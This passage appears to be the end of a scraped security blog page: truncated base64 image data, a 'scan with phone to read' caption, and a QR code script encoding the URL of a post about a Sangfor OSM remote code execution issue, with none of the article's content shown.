uF+3vvH7w/oR4Oj8Et4W4PbGfL9tL6ef6rLrPfOvynmFe3Vxj55I/06Lbm+tU5/TVVzy9KX0xWqq588RkUnLz8uC2EM0bX3sCDwvJBlPZVqofL14qXko/1ym5mGxKvsL0ptpPb6r1M55cSi/zUvLGeCn19KbkYrSUPD2pK56efZlXy4yUevBhIRHvet0JXC4kG0z5iLlONXfrjZ2D+UXAnP4Kc6/Uyv+Mnjmpz/Tss+lN+ey5TpnJdUreGG9f7YdfLiShu77vBLaFuPW+dety0bybb65+lbdPtK+5c0Rzwausvr2iuphZKbloPl5K3r48mX1d5dO3LSTkrtefwMOvvW509Wjt99Y/2rfKreat9LM5ZlfPqr5CZzpHbr51ub75Rn3z+vLg/QnxVH4IPvyW5XNlWyl5b1euL650fTGzUx/lPbd55qiJmZ+Kl1LP9Vkluy/zop696mL78kbzZ3h/QjzdH4IP/w5ZPZdbdqvyzre+4s6xf8W737yoH2zNmWIyqc5FS5kTO9e6vtj+Fbdvj/cnZH8aP+B6W0jekNTVMyWT6u13XzIp9Vyn5J/F9KZWfdHjp3y2XO8rmX2ZE82akbffvPNysfPO1ZcHt4Vo3vjaE9gW0luU+3hyMdtMyc2JK11f7Jw8s1Ny0b54KfVge/IVpj+lnxmpj3JzmZFKbyrX+zIXLyU/w20hZ+atff8JPCwkG0y54VynfDR1eWOyKfVcp1bceY3mV7r+M8x992XWmc1b1xf1RXXvoS4X1TvfPPmHhRi68TUn8LCQ3mbzbHFf+qJ/RnN71EXz+mLrcrFz0dXEaCnv1bpcTDZlvjFeapWPty/799r++sx/WMi+4b7+/hN4WIjbF30ktymqr3L6nVe3T1RfYeecu0d71eTdq25O7Jy80bxzRHPyFdp/ln9YyGrIrX/PCWy/9vbt3GLrbvXKN9f9K97z7FcX1c/Q2Xpye0V1sfPqv379+v0f6TTvfHPz6qL6M7w/Ic9O5wXe9muvb4+4epYr3z5z/XY0N2dfo3lR374z7IxcdJao3th+886fPUs0c7lOrXj0+xOSU/hBtf07xO1/FP0bsvGUferyeCn1XO/LnKhn/grtC66y8fa1yqmbla9wlVvpztEX1YP3JySn8INqW4hv5hWunr37Oqd/9lZ0Ntx8rp+VueAqFy+ln+t9rXQz+h/F/9qX+dtCQu56/Qk8LMQ3uPHqUTvvW6J+1b/Kq3e/c8/QrJ58hat7rPLq3ef9Gs2r23eGDwux+cbXnMCXF+LWfXy3Ll9h9zVf9Tn/Ga561Vf3Wumre5lv3/s0mlO3Xx788kIy5K6/dwJfXohbF1eP1m9D55uv8upn6L2dJapfoXlnd/5Kb995Pae5fcEvL6SH3/xrJ/CwELfaeHWbbDe1yvW8ZFPmc53qnL6oLz/DzDkrs84woy62b07d3ApXOefYZ26PDwsxfONrTmBbiNu7wqvH7H63r77qN9e+faL+Wd5Me83NOUsuqjeu/J5vn3l9sX1zwW0hhm587QncC3nt+T/c/X8AAAD//8RWs90AAAAGSURBVAMAszpcy4rh4zwAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor-osm-system-netConfig-set\_port-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 